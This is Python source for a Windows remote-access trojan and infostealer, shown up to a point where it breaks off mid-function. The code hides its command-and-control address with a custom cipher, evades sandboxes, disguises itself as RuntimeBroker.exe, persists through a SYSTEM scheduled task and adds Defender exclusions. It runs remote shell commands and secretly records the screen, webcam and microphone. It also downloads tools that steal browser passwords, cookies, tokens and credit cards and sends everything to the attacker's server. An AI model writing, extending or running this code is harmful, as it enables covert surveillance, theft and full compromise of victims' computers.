import sys, os, subprocess, requests, time, platform, json, zipfile, shutil, sqlite3, base64

# --- Suppress SSL warnings for Nuitka standalone (no cert bundle) ---
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except: pass

def _boot_log(msg):
    try:
        with open(os.path.join(os.environ.get('TEMP', 'C:\\'), 'akatsuki_debug.log'), 'a', encoding='utf-8') as f:
            f.write(msg + '\n')
    except: pass
_boot_log("PAYLOAD STARTED")

# --- OPERATIONAL MODE SWITCH ---
TEST_MODE = True

if platform.system() == "Windows": import ctypes

def elevate():
    if platform.system() == "Windows":
        try:
            if ctypes.windll.shell32.IsUserAnAdmin(): return
            
            # If running as Nuitka/PyInstaller exe, the exe already has UAC manifest, 
            # but if it was somehow bypassed, don't loop endlessly.
            # If running as raw .py, prompt UAC.
            if getattr(sys, 'frozen', False) or '__compiled__' in globals():
                # We are compiled. If we are not admin despite the manifest, just proceed or we might loop.
                return
                
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(f'"{a}"' for a in sys.argv), None, 0)
            os._exit(0)
        except Exception: pass
elevate()

def anti_analysis_and_mutex():
    if platform.system() != "Windows" or TEST_MODE: return
    
    # 1. Mutex (Prevent Duplicates)
    mutex_name = "Global\FSOCIETY_MUTEX_0X99"
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexW(None, False, mutex_name)
    last_error = kernel32.GetLastError()
    if last_error == 183: # ERROR_ALREADY_EXISTS
        os._exit(0) # Duplicate suicide
    
    # Keep mutex handle alive so it doesn't get garbage collected
    global _persistent_mutex
    _persistent_mutex = mutex
    
    # 2. Anti-Sandbox (Sleep evasion)
    start_time = time.time()
    time.sleep(15) # Sleep 15 seconds
    # If the VM fast-forwards sleep, time.time() difference will be tiny
    if time.time() - start_time < 14:
        os._exit(0) # Sandbox detected suicide
        
anti_analysis_and_mutex()

def establish_persistence_and_masquerade():
    if platform.system() != "Windows" or TEST_MODE: return
    
    # Target locations
    hidden_dir = os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Windows NT')
    os.makedirs(hidden_dir, exist_ok=True)
    
    # 1. Process Masquerading (Ghosting python.exe -> RuntimeBroker.exe)
    fake_exe_path = os.path.join(hidden_dir, "RuntimeBroker.exe")
    payload_path = os.path.join(hidden_dir, "sys_update.py")
    
    # Copy current python/exe runtime and payload script
    if not os.path.exists(fake_exe_path):
        try: shutil.copy2(sys.executable, fake_exe_path)
        except: pass
    if not os.path.exists(payload_path) or os.path.abspath(sys.argv[0]) != os.path.abspath(payload_path):
        try: shutil.copy2(sys.argv[0], payload_path)
        except: pass

    # If we are NOT already running as the fake RuntimeBroker, we respawn and die.
    if os.path.abspath(sys.executable) != os.path.abspath(fake_exe_path):
        # We spawn the ghost process
        subprocess.Popen([fake_exe_path, payload_path], creationflags=subprocess.CREATE_NO_WINDOW)
        os._exit(0) # Immediately kill the original python.exe so it vanishes from Task Manager

    # 2. Persistence (Scheduled Task)
    # At this point, we ARE running heavily disguised as RuntimeBroker.exe
    vbs_launcher = os.path.join(hidden_dir, "launch.vbs")
    if not os.path.exists(vbs_launcher):
        try:
            with open(vbs_launcher, "w") as f:
                f.write(f'Set objShell = CreateObject("WScript.Shell")\n')
                # 0 means hide window
                f.write(f'objShell.Run """{fake_exe_path}"" ""{payload_path}""", 0, False\n')
            
            # Create a scheduled task that runs on System Start/Logon with Highest Privileges
            task_cmd = f'schtasks /create /tn "Microsoft\\Windows\\Wininet\\CacheTask" /tr "wscript.exe \\"{vbs_launcher}\\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
            subprocess.run(task_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

establish_persistence_and_masquerade()
_boot_log("PERSISTENCE DONE")

try:
    import numpy as np # Required for screen recording
except ImportError:
    np = None
import threading as _th
import io
_boot_log("IMPORTS DONE")

# --- Configuration (OPSEC: Advanced Obfuscated C2 URL) ---
def _xd(d, s="k3ycu5t0m", r=4):
    import hashlib
    if not d or len(d) < 2: return ""
    SB = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    IS = [0]*256; [IS.__setitem__(v, i) for i, v in enumerate(SB)]
    sd = s.encode(); ks = []
    for _ in range(r): sd = hashlib.sha256(sd).digest(); ks.append(sd)
    raw = list(d); pc = [ks[-1][0]]
    for i in range(len(raw)):
        cur = raw[i]; raw[i] = (raw[i] - ks[2][i % len(ks[2])]) & 0xFF
        raw[i] ^= pc[-1]; pc.append(cur)
    m = len(raw) // 2; left, right = raw[:m], raw[m:]
    for rd in range(r - 1, -1, -1):
        rk = ks[rd % len(ks)]
        mx = [SB[(b ^ rk[i % len(rk)]) & 0xFF] for i, b in enumerate(left)]
        right = [b ^ x for b, x in zip(right, mx)]; left, right = right, left
    raw = left + right; n = len(raw); rs = int.from_bytes(ks[1][:8], 'big'); sw = []
    for i in range(n - 1, 0, -1):
        rs = (rs * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
        sw.append((i, rs % (i + 1)))
    for i, j in reversed(sw): raw[i], raw[j] = raw[j], raw[i]
    for i in range(len(raw)):
        k = ks[0][i % len(ks[0])]
        rt = (i + k) % 8; raw[i] = ((raw[i] >> rt) | (raw[i] << (8 - rt))) & 0xFF
        raw[i] = IS[(raw[i] ^ k) & 0xFF]
    ol = (raw[-2] << 8) | raw[-1]
    return bytes(raw[:ol]).decode()

_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
C2_URL = _xd(_C2_ENC)
_boot_log(f"C2_URL DECODED: {C2_URL}")
HEARTBEAT_INTERVAL = 5

def log(message):
    try:
        with open(os.path.join(os.environ.get('TEMP', 'C:\\'), 'akatsuki_debug.log'), 'a', encoding='utf-8') as f:
            f.write(message + '\n')
    except: pass
    if TEST_MODE: print(message)

# --- Stateful Shell Class ---
class StatefulShell:
    def __init__(self):
        self.cwd = os.getcwd()
    
    def execute(self, command):
        command = command.strip()
        if not command: return ""
        if command.lower().startswith('cd '):
            try:
                new_dir = command[3:].strip()
                if not os.path.isabs(new_dir): new_dir = os.path.join(self.cwd, new_dir)
                os.chdir(new_dir)
                self.cwd = os.getcwd()
                return f"Changed directory to: {self.cwd}"
            except Exception as e: return f"Error changing directory: {e}"
        try:
            is_windows = platform.system() == "Windows"
            shell_cmd = ["powershell.exe", "-NoProfile", "-Command", command] if is_windows else ["/bin/sh", "-c", command]
            result = subprocess.run(shell_cmd, cwd=self.cwd, capture_output=True, text=True, errors='ignore', timeout=60)
            return result.stdout + result.stderr if (result.stdout + result.stderr) else "Command executed."
        except Exception as e: return f"Error executing command: {e}"

# --- Helper & Media Functions ---
def post_output(client_id, cmd_id, command_line, output):
    # OPSEC: All output goes through C2 webhook proxy (no direct Discord contact)
    try:
        requests.post(f"{C2_URL}/report/{client_id}", 
                     json={'cmd_id': cmd_id, 'output': output, 'command': command_line},
                     headers={'ngrok-skip-browser-warning': '1'},
                     timeout=15, verify=False)
    except: pass

def exfiltrate_file(filepath, client_id=None, message=""):
    # OPSEC: All files go through C2 webhook proxy
    try:
        if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
            return f"File exfiltration failed: '{os.path.basename(filepath)}' is missing or empty."
        
        with open(filepath, 'rb') as f:
            requests.post(f"{C2_URL}/loot/{client_id}",
                         data={"message": message},
                         files={"file": (os.path.basename(filepath), f.read())},
                         headers={'ngrok-skip-browser-warning': '1'},
                         timeout=60, verify=False)
        return ""
    except Exception as e:
        return f"File exfiltration failed: {e}"
    finally:
        if os.path.exists(filepath) and not TEST_MODE:
            try: os.remove(filepath)
            except: pass

def get_geolocation():
    if platform.system() == "Windows":
        try:
            ps_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Add-Type -AssemblyName System.Device; $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher; $GeoWatcher.Start(); $i=0; while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied') -and ($i -lt 50)) { Start-Sleep -Milliseconds 100; $i++ }; if ($GeoWatcher.Permission -eq 'Granted' -and $GeoWatcher.Status -eq 'Ready') { $GeoWatcher.Position.Location | ConvertTo-Json } else { Write-Error 'Location access denied or timeout.' }\""
            result = subprocess.run(ps_command, capture_output=True, text=True, timeout=15, shell=True)
            if result.returncode == 0 and result.stdout:
                data = json.loads(result.stdout); lat = data.get('Latitude', 'N/A'); lon = data.get('Longitude', 'N/A')
                return (f"Source: Windows Location Service\nCoords: Lat={lat}, Lon={lon}\nMaps: https://maps.google.com/?q={lat},{lon}"), None
            else: return None, "GPS Error (or denied). Falling back to IP."
        except Exception: return None, "GPS Error. Falling back to IP."
    try:
        r = requests.get('https://ipinfo.io/json', timeout=10, verify=False); data = r.json()
        loc = data.get('loc', 'N/A').split(','); lat, lon = (loc[0], loc[1]) if len(loc) == 2 else ('N/A', 'N/A')
        return (f"Source: IP-based (INACCURATE)\nIP: {data.get('ip', 'N/A')}\n"
                f"Location: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}\n"
                f"Coords: Lat={lat}, Lon={lon}\nMaps: https://maps.google.com/?q={lat},{lon}"), None
    except Exception as e: return None, f"Geolocation failed: {e}"

def take_screenshot():
    try:
        import mss
        filepath = os.path.join(os.getenv("TEMP"), "s.png")
        with mss.mss() as sct:
            sct.shot(output=filepath)
        return filepath, None
    except Exception as e: return None, f"Screenshot failed: {e}"

def take_webcam_photo():
    filepath = os.path.join(os.getenv("TEMP"), "c.png")
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None, "Webcam could not be opened."
        time.sleep(1) # Allow camera to initialize
        ret, frame = cap.read()
        cap.release()
        cv2.destroyAllWindows()
        if ret:
            cv2.imwrite(filepath, frame)
            return filepath, None
        else:
            return None, "Webcam failed to capture frame."
    except Exception as e:
        return None, f"Webcam capture failed: {e}"

def record_screen_video(seconds=10):
    filepath = os.path.join(os.getenv("TEMP"), "s.mp4")
    try:
        import mss, cv2
        with mss.mss() as sct:
            mon = sct.monitors[1] # Primary monitor
            w, h = mon['width'], mon['height']
            out = cv2.VideoWriter(filepath, cv2.VideoWriter_fourcc(*'mp4v'), 10.0, (w, h))
            end_time = time.time() + seconds
            while time.time() < end_time:
                img = sct.grab(mon)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR) # Convert to BGR for OpenCV
                out.write(frame)
            out.release()
        return filepath, None
    except Exception as e:
        return None, f"Screen recording failed: {e}"

def record_video(seconds=10, mode='cam'):
    if mode == 'screen':
        return record_screen_video(seconds)
    
    filepath = os.path.join(os.getenv("TEMP"), "v.mp4")
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None, "Webcam could not be opened."
        w, h = int(cap.get(3)), int(cap.get(4))
        out = cv2.VideoWriter(filepath, cv2.VideoWriter_fourcc(*'mp4v'), 20.0, (w, h))
        end_time = time.time() + seconds
        while time.time() < end_time:
            ret, frame = cap.read()
            if not ret: break
            out.write(frame)
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        return filepath, None
    except Exception as e:
        return None, f"Webcam recording failed: {e}"

def record_audio(seconds=10):
    filepath = os.path.join(os.getenv("TEMP"), "a.wav")
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()
        write(filepath, fs, rec)
        return filepath, None
    except Exception as e:
        return None, f"Audio recording failed: {e}"

def get_ffmpeg_path():
    ffmpeg_dir = os.path.join(os.getenv("TEMP"), "ffmpeg_bin")
    ffmpeg_exe = os.path.join(ffmpeg_dir, "ffmpeg.exe")
    if os.path.exists(ffmpeg_exe): return ffmpeg_exe
    
    os.makedirs(ffmpeg_dir, exist_ok=True)
    zip_path = os.path.join(ffmpeg_dir, "ffmpeg.zip")
    log("[*] Downloading FFmpeg statically...")
    try:
        url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
        r = requests.get(url, stream=True, timeout=60, verify=False)
        with open(zip_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            for file_info in zip_ref.infolist():
                if "ffmpeg.exe" in file_info.filename:
                    file_info.filename = "ffmpeg.exe"
                    zip_ref.extract(file_info, ffmpeg_dir)
                    break
        os.remove(zip_path)
        return ffmpeg_exe
    except Exception as e:
        log(f"FFmpeg DL Error: {e}")
        return None

def find_audio_device(ffmpeg_exe, search_term=""):
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        res = subprocess.run([ffmpeg_exe, "-list_devices", "true", "-f", "dshow", "-i", "dummy"], capture_output=True, text=True, stderr=subprocess.STDOUT, creationflags=cf)
        in_audio_section = False
        for line in res.stdout.split('\n'):
            if "DirectShow audio devices" in line: in_audio_section = True; continue
            if in_audio_section and search_term.lower() in line.lower() and '"' in line:
                return line.split('"')[1]
        # If searching blank, just return the first audio device found
        if search_term == "" and in_audio_section:
            for line in res.stdout.split('\n'):
                if "DirectShow audio devices" in line: in_audio_section = True; continue
                if in_audio_section and '"' in line: return line.split('"')[1]
    except: pass
    return None

def record_av(seconds=10, mode='normal'):
    filepath = os.path.join(os.getenv("TEMP"), "av_sync.mp4")
    if os.path.exists(filepath): os.remove(filepath)
    
    ffmpeg_exe = get_ffmpeg_path()
    if not ffmpeg_exe: return None, "FFmpeg setup failed. Target blocked zip download?"
    
    mic = find_audio_device(ffmpeg_exe, "") 
    if not mic: mic = "Microphone" # Wild guess, might fail
    
    cmd = [ffmpeg_exe, "-y", "-f", "gdigrab", "-framerate", "15", "-i", "desktop"]
    if mode == 'full':
        stereo_mix = find_audio_device(ffmpeg_exe, "Stereo Mix")
        if stereo_mix:
            cmd.extend(["-f", "dshow", "-i", f"audio={mic}", "-f", "dshow", "-i", f"audio={stereo_mix}"])
            cmd.extend(["-filter_complex", "[1:a][2:a]amix=inputs=2[a]", "-map", "0:v", "-map", "[a]"])
        else:
            return None, "--full rejected: 'Stereo Mix' device not found or disabled in Target PC sound settings. Try regular 'record'."
    else:
        cmd.extend(["-f", "dshow", "-i", f"audio={mic}", "-map", "0:v", "-map", "1:a"])
    
    cmd.extend(["-c:v", "libx264", "-preset", "ultrafast", "-t", str(seconds), filepath])
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        subprocess.run(cmd, creationflags=cf, timeout=seconds + 5)
        return filepath, None
    except Exception as e:
        return None, f"FFmpeg Recording failed: {e}"

# =========================================================================
# V8 Arsenal: Browser Stealer, WiFi Stealer, AV Killer, Self-Update
# =========================================================================

# ---- Tier 1: DumpBrowserSecrets (Maldev Academy) - Best option ----
def get_dump_browser_secrets():
    """Download DumpBrowserSecrets ABE bypass tool on-demand.
    This tool uses Early Bird APC injection + IElevator COM to bypass ABE.
    Adds a Defender exclusion for the tool directory to prevent detection.
    """
    tool_dir = os.path.join(os.getenv('TEMP'), '.browser_tool')
    exe_path = os.path.join(tool_dir, 'DumpBrowserSecrets.exe')
    if os.path.exists(exe_path): return exe_path
    
    os.makedirs(tool_dir, exist_ok=True)
    
    # Add Defender exclusion for tool dir (silent, best-effort)
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        subprocess.run(
            f'powershell.exe -WindowStyle Hidden -NoProfile -Command "Add-MpPreference -ExclusionPath \'{tool_dir}\' -ErrorAction SilentlyContinue"',
            shell=True, creationflags=cf, timeout=10
        )
    except: pass
    
    url = 'https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/download/v1.2.0/DumpBrowserSecrets.exe'
    
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        ps_cmd = f"powershell.exe -WindowStyle Hidden -NoProfile -Command \"Invoke-WebRequest -Uri '{url}' -OutFile '{exe_path}'\""
        subprocess.run(ps_cmd, shell=True, creationflags=cf, timeout=120)
        if os.path.exists(exe_path):
            return exe_path
    except Exception as e:
        log(f"[!] DumpBrowserSecrets download failed: {e}")
    return None

def steal_browser_data_dbs(mode='passwords'):
    """Use DumpBrowserSecrets to bypass ABE and steal browser data.
    Outputs a single JSON file per browser (e.g. ChromeData.json) to cwd.
    JSON structure: {app_bound_key, dpapi_key, tokens, cookies, logins, credit_cards, autofill, history, bookmarks}
    """
    exe_path = get_dump_browser_secrets()
    if not exe_path: return None, "DumpBrowserSecrets download failed."
    
    # Run from TEMP so output goes there
    work_dir = os.getenv('TEMP')
    
    # Clean old output files
    for old in ['ChromeData.json', 'EdgeData.json', 'BraveData.json']:
        old_path = os.path.join(work_dir, old)
        if os.path.exists(old_path):
            try: os.remove(old_path)
            except: pass
    
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        cmd = f'"{exe_path}" /b:chrome /b:edge /b:brave /e:all'
        result = subprocess.run(cmd, shell=True, creationflags=cf, timeout=180,
                               capture_output=True, text=True, cwd=work_dir)
        log(f"[*] DBS stdout tail: {result.stdout[-300:] if result.stdout else 'empty'}")
        if result.returncode != 0:
            log(f"[!] DBS stderr: {result.stderr[-200:] if result.stderr else 'empty'}")
    except Exception as e:
        return None, f"DumpBrowserSecrets execution failed: {e}"
    
    # Collect output JSON files
    results = []
    browser_names = ['Chrome', 'Edge', 'Brave', 'Opera', 'Vivaldi', 'Operagx']
    json_files = []
    
    for bname in browser_names:
        p = os.path.join(work_dir, f'{bname}Data.json')
        if os.path.exists(p):
            json_files.append(p)
    
    if not json_files:
        return None, "DumpBrowserSecrets produced no output files."
    
    for json_path in json_files:
        try:
            with open(json_path, 'r', encoding='utf-8-sig') as f:
                data = json.loads(f.read())
            
            browser_name = os.path.basename(json_path).replace('Data.json', '')
            
            # Passwords
            if mode in ['passwords', 'all']:
                logins = data.get('logins', [])
                if logins:
                    results.append(f"\n=== {browser_name} Passwords ({len(logins)} items) ===")
                    for item in logins:
                        url = item.get('origin_url', item.get('action_url', 'N/A'))
                        user = item.get('username', item.get('username_value', ''))
                        pwd = item.get('password', item.get('password_value', ''))
                        if user:
                            results.append(f"URL: {url}\nUser: {user}\nPass: {pwd}\n")
            
            # Cookies
            if mode in ['cookies', 'all']:
                cookies = data.get('cookies', [])
                if cookies:
                    results.append(f"\n=== {browser_name} Cookies ({len(cookies)} items) ===")
                    for item in cookies[:300]:
                        host = item.get('host', item.get('host_key', ''))
                        name = item.get('name', '')
                        val = str(item.get('value', item.get('decrypted_value', '')))[:80]
                        results.append(f"{host} | {name} = {val}")
            
            if mode == 'all':
                # Tokens
                tokens = data.get('tokens', [])
                if tokens:
                    results.append(f"\n=== {browser_name} Tokens ({len(tokens)} items) ===")
                    for item in tokens:
                        svc = item.get('service', 'N/A')
                        tok = str(item.get('token', item.get('encrypted_token', '')))[:80]
                        results.append(f"Service: {svc} = {tok}...")
                
                # Credit Cards
                cards = data.get('credit_cards', [])
                if cards:
                    results.append(f"\n=== {browser_name} Credit Cards ({len(cards)} items) ===")
                    for item in cards:
                        name_on = item.get('name_on_card', item.get('name', 'N/A'))
                        num = item.get('card_number_encrypted', item.get('number', 'N/A'))
                        exp_m = item.get('expiration_month', item.get('month', '?'))
                        exp_y = item.get('expiration_year', item.get('year', '?'))
                        results.append(f"Card: {name_on} | {num} | Exp: {exp_m}/{exp_y}")
                
                # Autofill
                autofill = data.get('autofill', [])
                if autofill:
                    results.append(f"\n=== {browser_name} Autofill ({len(autofill)} items) ===")
                    for item in autofill[:100]:
                        results.append(f"{item.get('name', '')} = {item.get('value', '')}")
                
                # History  
                history = data.get('history', [])
                if history:
                    results.append(f"\n=== {browser_name} History ({len(history)} items) ===")
                    for item in history[:50]:
                        results.append(f"{item.get('url', '')} | {item.get('title', '')}")
            
            # Clean up JSON
            try: os.remove(json_path)
            except: pass
            
        except Exception as e:
            results.append(f"Error parsing {json_path}: {e}")
    
    # Also clean up extracted DLL
    dll_path = os.path.join(os.path.dirname(exe_path), 'DllExtractChromiumSecrets.dll')
    try: os.remove(dll_path)
    except: pass
    
    if not results: return None, "DumpBrowserSecrets found no data."
    
    output = "\n".join(results)
    filepath = os.path.join(os.getenv('TEMP'), f'browser_{mode}.txt')
    with open(filepath, 'w', encoding='utf-8') as f: f.write(output)
    return filepath, None

# ---- Tier 2: ChromeElevator (xaitax) - Backup, may be blocked by AV ----
def get_chromelevator():
    """Download ChromeElevator ABE bypass tool (backup method)."""
    tool_dir = os.path.join(os.getenv('TEMP'), '.chrome_elevator')
    exe_path = os.path.join(tool_dir, 'chromelevator.exe')
    if os.path.exists(exe_path): return exe_path
    
    os.makedirs(tool_dir, exist_ok=True)
    
    # Add Defender exclusion (best-effort)
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        subprocess.run(
            f'powershell.exe -WindowStyle Hidden -NoProfile -Command "Add-MpPreference -ExclusionPath \'{tool_dir}\' -ErrorAction SilentlyContinue"',
            shell=True, creationflags=cf, timeout=10
        )
    except: pass
    
    url = 'https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.19.0/chrome-injector-v0.19.0.zip'
    zip_path = os.path.join(tool_dir, 'ce.zip')
    
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        ps_cmd = (
            f"powershell.exe -WindowStyle Hidden -NoProfile -Command \""
            f"Invoke-WebRequest -Uri '{url}' -OutFile '{zip_path}'; "
            f"Expand-Archive -Path '{zip_path}' -DestinationPath '{tool_dir}' -Force; "
            f"Remove-Item '{zip_path}' -Force; "
            f"Get-ChildItem '{tool_dir}' -Filter 'chromelevator*x64*.exe' -Recurse | "
            f"ForEach-Object {{ Copy-Item $_.FullName '{exe_path}' -Force }}\""
        )
        subprocess.run(ps_cmd, shell=True, creationflags=cf, timeout=120)
        if os.path.exists(exe_path):
            return exe_path
    except Exception as e:
        log(f"[!] ChromeElevator download failed: {e}")
    return None

def steal_browser_data_chromelevator(mode='passwords'):
    """Use ChromeElevator to bypass ABE (backup, often blocked by Defender)."""
    exe_path = get_chromelevator()
    if not exe_path: return None, "ChromeElevator download failed."
    
    output_dir = os.path.join(os.getenv('TEMP'), '.chrome_elevator', 'output')
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir, ignore_errors=True)
    
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        cmd = f'"{exe_path}" --output-path "{output_dir}" all'
        result = subprocess.run(cmd, shell=True, creationflags=cf, timeout=120,
                               capture_output=True, text=True)
        if result.returncode != 0:
            return None, f"ChromeElevator blocked or failed: {result.stderr[:200] if result.stderr else 'unknown error'}"
    except Exception as e:
        return None, f"ChromeElevator execution failed: {e}"
    
    if not os.path.exists(output_dir):
        return None, "ChromeElevator produced no output."
    
    results = []
    for browser_name in os.listdir(output_dir):
        browser_path = os.path.join(output_dir, browser_name)
        if not os.path.isdir(browser_path): continue
        for profile_name in os.listdir(browser_path):
            profile_path = os.path.join(browser_path, profile_name)
            if not os.path.isdir(profile_path): continue
            
            if mode == 'all':
                targets = ['passwords', 'cookies', 'payments', 'iban', 'tokens']
            elif mode == 'cookies':
                targets = ['cookies']
            else:
                targets = ['passwords']
            
            for target in targets:
                json_path = os.path.join(profile_path, f"{target}.json")
                if not os.path.exists(json_path): continue
                try:
                    with open(json_path, 'r', encoding='utf-8-sig') as f:
                        data = json.loads(f.read())
                    if not data: continue
                    results.append(f"\n=== {browser_name}/{profile_name} - {target} ({len(data)} items) ===")
                    for item in data:
                        if target == 'passwords':
                            url = item.get('url', item.get('origin_url', 'N/A'))
                            user = item.get('user', item.get('username_value', ''))
                            pwd = item.get('pass', item.get('password_value', ''))
                            if user: results.append(f"URL: {url}\nUser: {user}\nPass: {pwd}\n")
                        elif target == 'cookies':
                            host = item.get('host', item.get('host_key', ''))
                            name = item.get('name', '')
                            val = str(item.get('value', ''))[:80]
                            results.append(f"{host} | {name} = {val}")
                        elif target == 'payments':
                            results.append(f"Card: {item.get('name','')} | {item.get('number','')} | Exp: {item.get('month','?')}/{item.get('year','?')}")
                        elif target == 'iban':
                            results.append(f"IBAN: {item.get('nickname','')} | {item.get('iban','')}")
                        elif target == 'tokens':
                            results.append(f"Token: {item.get('service','')} = {str(item.get('token',''))[:60]}...")
                except Exception as e:
                    results.append(f"Error: {e}")
    
    shutil.rmtree(output_dir, ignore_errors=True)
    if not results: return None, "ChromeElevator found no data."
    
    output = "\n".join(results)
    filepath = os.path.join(os.getenv('TEMP'), f'browser_{mode}.txt')
    with open(filepath, 'w', encoding='utf-8') as f: f.write(output)
    return filepath, None

# ---- Tier 3: DPAPI Legacy (for Opera/Vivaldi/old browsers) ----
def steal_browser_data_dpapi(mode='passwords'):
    """Legacy DPAPI-based stealer (fallback for Opera/Vivaldi which don't use ABE)."""
    if platform.system() != "Windows": return None, "Browser stealer is Windows-only."
    
    results = []
    browsers = {
        'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data'),
        'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data'),
    }
    
    for browser_name, user_data_path in browsers.items():
        local_state_path = os.path.join(user_data_path, 'Local State')
        if not os.path.exists(local_state_path): continue
        
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]
            
            import ctypes, ctypes.wintypes
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
            
            input_blob = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
            output_blob = DATA_BLOB()
            ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(input_blob), None, None, None, None, 0, ctypes.byref(output_blob))
            master_key = ctypes.string_at(output_blob.pbData, output_blob.cbData)
            
            if mode == 'passwords':
                db_name = 'Login Data'
                results.append(f"\n=== {browser_name} Passwords (DPAPI Fallback) ===")
            else:
                db_name = 'Cookies'
                results.append(f"\n=== {browser_name} Cookies (DPAPI Fallback) ===")
            
            profiles = ['Default'] + [f'Profile {i}' for i in range(1, 10)]
            for profile in profiles:
                if mode == 'passwords':
                    db_path = os.path.join(user_data_path, profile, db_name)
                else:
                    db_path = os.path.join(user_data_path, profile, 'Network', db_name)
                    if not os.path.exists(db_path):
                        db_path = os.path.join(user_data_path, profile, db_name)
                
                if not os.path.exists(db_path): continue
                
                temp_db = os.path.join(os.getenv('TEMP'), f'tmp_{browser_name}_{profile}_{db_name}.db')
                try: shutil.copy2(db_path, temp_db)
                except: continue
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                try:
                    if mode == 'passwords':
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for url, user, enc_pass in cursor.fetchall():
                            if not user: continue
                            try:
                                if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
                                    from Crypto.Cipher import AES
                                    iv = enc_pass[3:15]; payload_bytes = enc_pass[15:-16]; tag = enc_pass[-16:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                                    decrypted = cipher.decrypt_and_verify(payload_bytes, tag).decode('utf-8', errors='ignore')
                                else:
                                    import win32crypt
